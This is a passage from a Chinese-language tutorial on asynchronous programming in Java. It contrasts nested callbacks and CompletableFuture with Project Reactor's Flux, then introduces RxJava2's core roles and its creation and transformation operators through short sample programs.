<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UiUtils</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">submitOnUiThread</span><span class="hljs-params">(Runnable runnable)</span>{
        <span class="hljs-comment">// 线程池中的线程做响应的操作………………</span>
    }


    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">(Object obj)</span>{
        <span class="hljs-comment">// 利用UI线程展示具体数据</span>
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">error</span><span class="hljs-params">(Object obj)</span>{
        <span class="hljs-comment">// 出现错误响应的内容</span>
    }

}
</code></pre>
<p>完成了 Controller 中的异步编程效果</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RestController</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CallBackHellController</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> UserService userService;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ItemService itemService;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> SuggestionService suggestionService;


    <span class="hljs-meta">@GetMapping("/callbackhell")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">callbackHell</span><span class="hljs-params">(String userId)</span>{
        <span class="hljs-comment">//1、调用用户服务，查询Top5商品Id</span>
        userService.getFav(userId, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Callback</span>&lt;List&lt;String&gt;&gt;() {
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onSuccess</span><span class="hljs-params">(List&lt;String&gt; list)</span> {
                <span class="hljs-comment">// 已经查询到商品Id，但是不知道是否有值</span>
                <span class="hljs-keyword">if</span> (list.isEmpty()){
                    <span class="hljs-comment">// 3、用户没有Top5商品Id，通过推荐服务查询推荐商品详情</span>
                    suggestionService.getSuggestion(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Callback</span>&lt;List&lt;Fav&gt;&gt;(){
                        <span class="hljs-meta">@Override</span>
                        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onSuccess</span><span class="hljs-params">(List&lt;Fav&gt; favs)</span> {
                            <span class="hljs-comment">// 推荐服务查询到了商品详情，响应即可</span>
                            UiUtils.submitOnUiThread(() -&gt; {
                                favs.stream().limit(<span class="hljs-number">5</span>).forEach(UiUtils::show);
                            });
                        }
                        <span class="hljs-meta">@Override</span>
                        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onError</span><span class="hljs-params">(Throwable throwable)</span> {
                            UiUtils.error(throwable);
                        }
                    });

                }
                <span class="hljs-keyword">else</span>{
                    <span class="hljs-comment">// 2、通过用户查询到了Top5商品Id，通过商品Id查询商品详情</span>
                    list.stream().limit(<span class="hljs-number">5</span>).forEach(itemId -&gt; itemService.getDetail(itemId,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Callback</span>&lt;Fav&gt;(){

                        <span class="hljs-meta">@Override</span>
                        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onSuccess</span><span class="hljs-params">(Fav fav)</span> {
                            <span class="hljs-comment">// 查询到了商品详情，利用UI线程，给客户端响应数据</span>
                            UiUtils.submitOnUiThread(() -&gt; UiUtils.show(fav));
                        }

                        <span class="hljs-meta">@Override</span>
                        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onError</span><span class="hljs-params">(Throwable throwable)</span> {
                            <span class="hljs-comment">// 出现异常了。</span>
                            UiUtils.error(throwable);
                        }
                    }));
                }
            }
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onError</span><span class="hljs-params">(Throwable throwable)</span> {
                <span class="hljs-comment">// 出现异常了。</span>
                UiUtils.error(throwable);
            }
        });


    }

}
</code></pre>
<h3 data-id="heading-6">解决回调地狱问题</h3>
<p>这里为了解决回调地狱问题，需要一个 Reactor 的依赖来帮助咱们实现异步编程。</p>
<p>需要导入依赖</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!--reactor的核心依赖--&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.projectreactor<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>reactor-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.7.7<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p>不能再使用之前的 Callback 方式了。需要使用 reactor 提供的 Flux，并且这种链式操作会更直观，也更好维护。就只需要修改三个服务对应的 Service。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserService</span> {

    <span class="hljs-comment">/**
     * 根据用户ID查询Top5商品ID
     * <span class="hljs-doctag">@param</span> userId
     * <span class="hljs-doctag">@return</span>
     */</span>
    Flux&lt;List&lt;String&gt;&gt; <span class="hljs-title function_">getFav</span><span class="hljs-params">(String userId)</span>;

}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ItemService</span> {


    <span class="hljs-comment">/**
     * 根据商品ID查询商品详情
     * <span class="hljs-doctag">@param</span> itemId
     * <span class="hljs-doctag">@return</span>
     */</span>
    Flux&lt;Fav&gt; <span class="hljs-title function_">getDetail</span><span class="hljs-params">(String itemId)</span>;

}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">SuggestionService</span> {

    <span class="hljs-comment">/**
     * 获取推荐的商品详情
     * <span class="hljs-doctag">@return</span>
     */</span>
    Flux&lt;List&lt;Fav&gt;&gt; <span class="hljs-title function_">getSuggestion</span><span class="hljs-params">()</span>;

}
</code></pre>
<p>然后就可以利用 Flux 提供的 API 来解决之前回调地狱的问题。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RestController</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReactorCallbackController</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> UserService userService;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ItemService itemService;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> SuggestionService suggestionService;


    <span class="hljs-meta">@GetMapping("reactorcallback")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reactorCallback</span><span class="hljs-params">(String userId)</span>{
        userService
                .getFav(userId)   <span class="hljs-comment">// 根据用户Id查询Top5商品Id</span>
                .flatMap(itemService::getDetail)  <span class="hljs-comment">// 根据商品ID查询商品详情</span>
                .switchIfEmpty(suggestionService.getSuggestion())  <span class="hljs-comment">// 如果前面为null，这里通过推荐服务查询商品详情</span>
                .take(<span class="hljs-number">5</span>)    <span class="hljs-comment">// 获取前5个数据</span>
                .publishOn(UiUtils.reactorOnUiThread())    <span class="hljs-comment">// 使用Ui线程</span>
                .subscribe(UiUtils::show,UiUtils::error);   <span class="hljs-comment">// 成功走show，失败走error</span>
    }

}
</code></pre>
<h3 data-id="heading-7">CompletableFuture 的异步编程</h3>
<p>Future 的形式相比 Callback Hell 效果要好一些，虽然 JDK8 和 9 都对 CompletableFuture 做了各种优化，但是他的表现还是不太好。多个Future在嵌套时，可读性还是比较差的。并且 CompletableFuture 不存在什么回压，或者是延迟调用的功能。</p>
<p>现在借助 CompletableFuture 来实现一个场景。</p>
<ol>
<li>获取一个用户ID的列表。</li>
<li>通过用户ID分别获取他的名字以及统计信息。（希望这两个操作是并行执行的）</li>
<li>当两个信息都获取到之后，封装成一个普通字符串即可。</li>
<li>响应数据，最后拿到结果（输出一下）。</li>
</ol>
<p>实现代码</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GetNameAndStatTestByCF</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// 1、获取一组用户ID列表</span>
        CompletableFuture&lt;List&lt;String&gt;&gt; idList = getID();
        CompletableFuture&lt;List&lt;String&gt;&gt; dataCompletableFuture = idList.thenComposeAsync(ids -&gt; {
            Stream&lt;CompletableFuture&lt;String&gt;&gt; resultStream = ids.stream().map(id -&gt; {
                <span class="hljs-comment">// 2、并行基于ID查询名称信息</span>
                CompletableFuture&lt;String&gt; nameTask = getName();
                <span class="hljs-comment">// 2、并行基于ID查询统计信息</span>
                CompletableFuture&lt;Integer&gt; statTask = getStat();
                <span class="hljs-comment">// 让两个查询名称信息和查询统计信息操作并行执行</span>
                <span class="hljs-keyword">return</span> nameTask.thenCombineAsync(statTask, (name, stat) -&gt; {
                    <span class="hljs-comment">// 3、拿到信息组装</span>
                    <span class="hljs-keyword">return</span> <span class="hljs-string">"Name："</span> + name + <span class="hljs-string">"，Stat："</span> + stat;
                });
            });
            <span class="hljs-comment">// 将resultStream转换成一个数组</span>
            List&lt;CompletableFuture&lt;String&gt;&gt; resultList = resultStream.toList();
            <span class="hljs-comment">// 全部的任务封装起来</span>
            CompletableFuture&lt;Void&gt; allDone = CompletableFuture.allOf(resultList.toArray(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CompletableFuture</span>[]{}));
            <span class="hljs-comment">// 执行全部任务</span>
            <span class="hljs-keyword">return</span> allDone.thenApplyAsync(v -&gt; resultList.stream()
                    .map(CompletableFuture::join)
                    .collect(Collectors.toList()));
        });

        <span class="hljs-comment">// 4、获取全部的组件信息后响应客户端（输出）</span>
        List&lt;String&gt; data = dataCompletableFuture.join();
        System.out.println(data);
    }

    <span class="hljs-comment">// 模拟zz服务获取统计信息</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> CompletableFuture&lt;Integer&gt; <span class="hljs-title function_">getStat</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> CompletableFuture.supplyAsync(() -&gt; <span class="hljs-number">666</span>);
    }

    <span class="hljs-comment">// 模拟yy服务获取名称信息</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> CompletableFuture&lt;String&gt; <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> CompletableFuture.supplyAsync(() -&gt; <span class="hljs-string">"张三"</span>);
    }

    <span class="hljs-comment">// 模拟xx服务，获取一组用户ID</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> CompletableFuture&lt;List&lt;String&gt;&gt; <span class="hljs-title function_">getID</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> CompletableFuture.supplyAsync(() -&gt; {
            <span class="hljs-comment">// 模拟查询三方服务</span>
            List&lt;String&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
            list.add(<span class="hljs-string">"1"</span>);
            list.add(<span class="hljs-string">"2"</span>);
            list.add(<span class="hljs-string">"3"</span>);
            <span class="hljs-keyword">return</span> list;
        });
    }

}
</code></pre>
<h3 data-id="heading-8">解决 CompletableFuture 的问题</h3>
<p>CompletableFuture 可以实现一些简单的异步编程，但是可看性和维护性以后后期的扩展都需要对整体代码做比较大成本的维护。依然采用 Reactor 来实现一个一模一样的逻辑，再看代码效果。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GetNameAndStatByReactor</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// 1、获取一组用户ID列表</span>
        Flux&lt;String&gt; idFlux = getId();

        Flux&lt;String&gt; result = idFlux.flatMap(id -&gt; {
            <span class="hljs-comment">// 2、并行基于ID查询名称信息</span>
            Flux&lt;String&gt; nameFlux = getName(id);
            <span class="hljs-comment">// 2、并行基于ID查询统计信息</span>
            Flux&lt;Integer&gt; statFlux = getStat(id);
            <span class="hljs-comment">// 俩任务并行处理完毕，触发3</span>
            <span class="hljs-keyword">return</span> nameFlux.zipWith(statFlux, (name, stat) -&gt; {
                <span class="hljs-comment">// 3、拿到信息组装</span>
                <span class="hljs-keyword">return</span> <span class="hljs-string">"Name："</span> + name + <span class="hljs-string">"，Stat："</span> + stat;
            });
        });
        Mono&lt;List&lt;String&gt;&gt; listMono = result.collectList();
        List&lt;String&gt; info = listMono.block();
        <span class="hljs-comment">// 4、获取全部的组件信息后响应客户端（输出）</span>
        System.out.println(info);
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Flux&lt;Integer&gt; <span class="hljs-title function_">getStat</span><span class="hljs-params">(String id)</span> {
        <span class="hljs-comment">// 会查询三方服务，然后封装结果</span>
        <span class="hljs-keyword">return</span> Flux.just(<span class="hljs-number">888</span>);
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Flux&lt;String&gt; <span class="hljs-title function_">getName</span><span class="hljs-params">(String id)</span> {
        <span class="hljs-comment">// 会查询三方服务，然后封装结果</span>
        <span class="hljs-keyword">return</span> Flux.just(<span class="hljs-string">"张三"</span>);
    }


    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Flux&lt;String&gt; <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 会查询三方服务，然后封装结果</span>
        <span class="hljs-keyword">return</span> Flux.just(<span class="hljs-string">"1"</span>,<span class="hljs-string">"2"</span>,<span class="hljs-string">"3"</span>);
    }
}
</code></pre>
<h2 data-id="heading-9">RxJava2 实现异步编程</h2>
<p>RxJava 是一个小框架，或者是依赖库。在 RxJava 的1.x版本中，它并不基于 Reactive Streams 去实现的。没有关系，因为 RxJava 的 2 版本，就是基于Reactive Streams 实现的了。</p>
<p>使用 RxJava 巨简单，因为作者想将 RxJava 尽量做到轻量级，就一个依赖。</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!--RxJava2的依赖--&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.reactivex.rxjava2<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>rxjava<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.2.21<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<h3 data-id="heading-10">RxJava2 的入门操作</h3>
<p>获取一个 Person 对象的集合，将 Person 集合中的所有年龄大于10岁的 Person 对象筛选出来，并输出他的名字。</p>
<p>采用 RxJava 来实现一下：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">//1、获取Person对象集合</span>
        List&lt;Person&gt; personList = getPersonList();

        <span class="hljs-comment">//2、完成上面要求的操作</span>
        <span class="hljs-comment">//2.1、将person集合转换为RxJava的流</span>
        Flowable.fromArray(personList.toArray(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>[]{}))
                <span class="hljs-comment">//2.2 过滤年龄大于10岁的</span>
                .filter(person -&gt; person.getAge() &gt; <span class="hljs-number">10</span>)
                <span class="hljs-comment">//2.3 获取筛选后的Person名称</span>
                .map(person -&gt; person.getName())
                <span class="hljs-comment">//2.4 输出Name</span>
                .subscribe(System.out::println);
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> List&lt;Person&gt; <span class="hljs-title function_">getPersonList</span><span class="hljs-params">()</span> {
        List&lt;Person&gt; personList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        personList.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">"大娃"</span>,<span class="hljs-number">5</span>));
        personList.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">"二娃"</span>,<span class="hljs-number">7</span>));
        personList.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">"三娃"</span>,<span class="hljs-number">9</span>));
        personList.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">"四娃"</span>,<span class="hljs-number">11</span>));
        personList.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">"五娃"</span>,<span class="hljs-number">13</span>));
        <span class="hljs-keyword">return</span> personList;
    }
}
</code></pre>
<h3 data-id="heading-11">RxJava2 的基础处理流程</h3>
<p>在 RxJava 中有三个核心的角色</p>
<ul>
<li>被观察者（Observable）</li>
<li>观察者（Observer）</li>
<li>订阅（Subscribe）</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo2</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">//1、构建Observable</span>
        Observable&lt;String&gt; observable = Observable.create(emitter -&gt; {
            emitter.onNext(<span class="hljs-string">"Hello"</span>);
            emitter.onNext(<span class="hljs-string">"World"</span>);
            emitter.onComplete();
        });

        <span class="hljs-comment">//2、构建Observer</span>
        Observer&lt;String&gt; observer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Observer</span>&lt;&gt;() {
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onSubscribe</span><span class="hljs-params">(Disposable d)</span> {
                System.out.println(<span class="hljs-string">"开始订阅"</span>);
            }

            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onNext</span><span class="hljs-params">(String s)</span> {
                System.out.println(<span class="hljs-string">"观察者："</span> + s);
            }

            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onError</span><span class="hljs-params">(Throwable e)</span> {
                e.printStackTrace();
            }

            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onComplete</span><span class="hljs-params">()</span> {
                System.out.println(<span class="hljs-string">"订阅结束"</span>);
            }
        };

        <span class="hljs-comment">//3、订阅</span>
        observable.subscribe(observer);
    }

}
</code></pre>
<h3 data-id="heading-12">创建操作符</h3>
<h4 data-id="heading-13">create</h4>
<p>Observable.create() 是手动创建 Observable 的方法，允许完全控制数据的发射、完成和错误处理。</p>
<pre><code class="hljs language-java" lang="java">Observable&lt;String&gt; observable = Observable.create(emitter -&gt; {
    emitter.onNext(<span class="hljs-string">"Hello"</span>);
    emitter.onNext(<span class="hljs-string">"World"</span>);
    emitter.onComplete();
});

observable.subscribe(
    item -&gt; System.out.println(<span class="hljs-string">"收到: "</span> + item),
    error -&gt; System.err.println(<span class="hljs-string">"错误: "</span> + error),
    () -&gt; System.out.println(<span class="hljs-string">"完成"</span>)
);

<span class="hljs-comment">// 输出：</span>
<span class="hljs-comment">// 收到: Hello</span>
<span class="hljs-comment">// 收到: World</span>
<span class="hljs-comment">// 完成</span>
</code></pre>
<h4 data-id="heading-14">just</h4>
<p>just 用于创建一个发射固定数据的 Observable，数据是预定义的，发射后立即完成。</p>
<pre><code class="hljs language-java" lang="java">Observable.just(<span class="hljs-string">"Hello"</span>)
    .subscribe(item -&gt; 
        System.out.println(<span class="hljs-string">"收到: "</span> + item)
    );

<span class="hljs-comment">// 输出：</span>
<span class="hljs-comment">// 收到: Hello</span>
</code></pre>
<h4 data-id="heading-15">fromArray</h4>
<p>fromArray 用于从数组创建一个 Observable，按数组顺序发射所有元素。</p>
<pre><code class="hljs language-java" lang="java">String[] fruits = {<span class="hljs-string">"Apple"</span>, <span class="hljs-string">"Banana"</span>, <span class="hljs-string">"Cherry"</span>, <span class="hljs-string">"Date"</span>};
Observable.fromArray(fruits)
    .subscribe(fruit -&gt; 
        System.out.print(fruit + <span class="hljs-string">" "</span>)
    );

<span class="hljs-comment">// 输出：</span>
<span class="hljs-comment">// Apple Banana Cherry Date</span>
</code></pre>
<h4 data-id="heading-16">fromCallable</h4>
<p>fromCallable 用于从 Callable 创建 Observable，Callable 的返回值会被包装成 Observable 发射。</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        Observable.fromCallable(() -&gt; <span class="hljs-string">"计算结果: "</span> + System.currentTimeMillis())
                .subscribe(System.out::println);

        <span class="hljs-comment">// 输出：</span>
        <span class="hljs-comment">// 计算结果: 1620000000000</span>
    }
</code></pre>
<h4 data-id="heading-17">timer</h4>
<p>timer 用于创建一个延迟指定时间后发射单个数据的 Observable，通常是 0L，然后结束。</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException {
        System.out.println(<span class="hljs-string">"开始时间: "</span> + System.currentTimeMillis());

        Observable.timer(<span class="hljs-number">2</span>, TimeUnit.SECONDS)
                .subscribe(tick -&gt;
                        System.out.println(<span class="hljs-string">"触发时间: "</span> + System.currentTimeMillis() + <span class="hljs-string">"，值: "</span> + tick)
                );

        Thread.sleep(<span class="hljs-number">3000</span>);
    }
</code></pre>
<p>默认使用 <code>Schedulers.computation()</code>线程池计算，线程池中的线程是守护线程，如果主线程结束守护线程也会随之终止。</p>
<h4 data-id="heading-18">interval</h4>
<p>interval() 方法用于创建一个 周期性定时发射的 Observable，它会按照指定的时间间隔无限期地发射递增的数字序列（从0开始）。</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException {
        Observable.interval(<span class="hljs-number">2</span>, TimeUnit.SECONDS)
                .subscribe(aLong -&gt; System.out.println(Thread.currentThread().getName() + <span class="hljs-string">"："</span> + aLong));

        System.in.read();
    }
</code></pre>
<h4 data-id="heading-19">intervalRange</h4>
<p>intervalRange() 是 interval() 的增强版本，用于创建一个有限次数的周期性发射的 Observable。它允许你指定起始值、发射次数、初始延迟和间隔时间。</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException {
        Observable.intervalRange(<span class="hljs-number">100</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, TimeUnit.SECONDS)
                .subscribe(aLong -&gt; System.out.println(Thread.currentThread().getName() + <span class="hljs-string">"："</span> + aLong));
        System.in.read();
    }
</code></pre>
<h4 data-id="heading-20">range &amp; rangeLong</h4>
<p>这两个方法用于创建一个发射连续整数序列的 Observable：</p>
<ul>
<li><code>range(start, count)</code>：发射 Integer 类型的连续整数。</li>
<li><code>rangeLong(start, count)</code>：发射 Long 类型的连续整数。</li>
</ul>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException {
        Observable.range(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>)
                .subscribe(integer -&gt; System.out.println(Thread.currentThread().getName() + <span class="hljs-string">"："</span> + integer));
        System.in.read();
    }
</code></pre>
<h4 data-id="heading-21">never、error、empty</h4>
<p>这三个方法都是创建特殊的 Observable 的工厂方法，用于特定的场景。</p>
<ul>
<li>never：创建一个永远不会发射任何数据，也不会终止的 Observable。</li>
<li>error：创建一个立即发射错误的 Observable。</li>
<li>empty：创建一个立即完成但不发射任何数据的 Observable。</li>
</ul>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// Observable.never()</span>
        <span class="hljs-comment">// Observable.error(new RuntimeException("error事件"))</span>
        Observable.empty()
                .subscribe(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Observer</span>() {
                    <span class="hljs-meta">@Override</span>
                    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onSubscribe</span><span class="hljs-params">(Disposable d)</span> {
                        System.out.println(<span class="hljs-string">"开始订阅"</span>);
                    }

                    <span class="hljs-meta">@Override</span>
                    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onNext</span><span class="hljs-params">(Object s)</span> {
                        System.out.println(<span class="hljs-string">"观察者："</span> + s);
                    }

                    <span class="hljs-meta">@Override</span>
                    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onError</span><span class="hljs-params">(Throwable e)</span> {
                        System.out.println(<span class="hljs-string">"出现异常："</span> + e.getMessage());
                    }

                    <span class="hljs-meta">@Override</span>
                    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onComplete</span><span class="hljs-params">()</span> {
                        System.out.println(<span class="hljs-string">"订阅结束"</span>);
                    }
                });
    }
</code></pre>
<h3 data-id="heading-22">转换操作符</h3>
<p>转换操作符是 RxJava 中用于对 Observable 发射的数据进行变换、处理、组合的操作符，用于实现数据流的各种转换逻辑。</p>
<h4 data-id="heading-23">map</h4>
<p>map() 是 RxJava 中最基本、最常用的转换操作符，用于对 Observable 发射的每个元素进行一对一转换。</p>
<p>简单来说：输入一个值，输出另一个值（1进1出）。</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        Observable.just(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>)
                .map(number -&gt; <span class="hljs-string">"数字: "</span> + number)
                .subscribe(text -&gt; System.out.println(text));
    }
</code></pre>
<h4 data-id="heading-24">flatMap</h4>
<p>flatMap() 用于将每个发射项转换为 Observable，然后"扁平化"合并成一个 Observable。
简单来说：输入一个值，可以输出任意多个值（1进N出）。</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        Observable.just(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>)
                .map(letter -&gt; letter + <span class="hljs-string">"1"</span>)
                .subscribe(result -&gt; System.out.print(result + <span class="hljs-string">" "</span>));
        <span class="hljs-comment">// 输出: A1 B1</span>

        <span class="hljs-comment">// flatMap: 1对多转换</span>
        Observable.just(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>)
                .flatMap(letter -&gt;
                        Observable.just(letter + <span class="hljs-string">"1"</span>, letter + <span class="hljs-string">"2"</span>, letter + <span class="hljs-string">"3"</span>)
                )
                .subscribe(result -&gt; System.out.print(result + <span class="hljs-string">" "</span>));
        <span class="hljs-comment">// 输出: A1 A2 A3 B1 B2 B3</span>
    }
</code></pre>
<h4 data-id="heading-25">concatMap</h4>
<p>concatMap() 是 flatMap() 的顺序保持版本，它会严格按照原始顺序依次处理每个元素，只有前一个元素的 Observable 完成之后，才会处理下一个。
简单来说：flatMap是并发处理，concatMap是串行处理。</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException {
